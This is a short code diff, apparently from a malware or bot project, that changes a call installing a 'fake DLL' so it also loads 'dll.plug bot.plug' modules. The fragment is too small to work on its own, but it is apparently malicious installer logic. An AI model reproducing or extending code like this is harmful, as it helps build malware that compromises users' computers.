@@ -673,7 +673,7 @@ namespace HisAnalizer
 		if (Executed)
 		{
 			#ifndef AGENTFULLTEST
-				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(), false);
+				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(), "dll.plug bot.plug", false);
 			#endif
         }
 
